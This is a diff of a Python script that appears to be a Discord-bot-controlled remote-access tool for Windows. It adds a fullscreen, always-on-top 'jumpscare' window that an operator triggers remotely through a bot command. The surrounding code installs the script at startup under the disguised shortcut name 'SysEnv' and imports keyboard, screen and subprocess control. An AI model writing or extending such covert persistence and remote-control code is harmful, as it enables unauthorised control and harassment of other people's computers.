@@ -5,7 +5,7 @@ import os
 import pyautogui
 from nextcord import File
 import time
-from PIL import Image
+from PIL import Image, ImageTk
 import keyboard
 import subprocess
 import string
@@ -33,6 +33,7 @@ import win32com.client
 from pathlib import Path
 import socket as st1
 import winsound
+import tkinter as tk
 
 
 user_profile = os.environ['USERPROFILE']
@@ -49,6 +50,29 @@ shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 
 CHANNEL_ID = 1355560563622678699
 jumpscaring = False
+
+def show_fullscreen_jumpscare():
+    root = tk.Tk()
+    root.title("Jumpscare")
+
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.configure(bg='black')
+
+    image_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'jumpscare', 'jumpscare.png')
+    img = Image.open(image_path)
+
+    screen_width = root.winfo_screenwidth()
+    screen_height = root.winfo_screenheight()
+    img = img.resize((screen_width, screen_height), Image.LANCZOS)
+    tk_img = ImageTk.PhotoImage(img)
+
+    label = tk.Label(root, image=tk_img)
+    label.pack()
+
+    root.after(1000, root.destroy)
+
+    root.mainloop()
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
@@ -764,10 +788,8 @@ async def jumpscare(interaction: nextcord.Interaction):
             n -= 1
         print("Jumpscare activated")
         await interaction.edit_original_message(content="Jumpscare activated!, sending jumpscare...")
-        img = cv2.imread("jumpscare/jumpscare.png")
         print("Opening jumpscare image...")
-        cv2.namedWindow("Jumpscare", cv2.WND_PROP_FULLSCREEN)
-        cv2.imshow("Jumpscare", img)
+        show_fullscreen_jumpscare()
         print("Jumpscare image opened")
         print("Playing jumpscare sound...")
         winsound.PlaySound("jumpscare/jumpscare.wav", winsound.SND_FILENAME | winsound.SND_ASYNC)
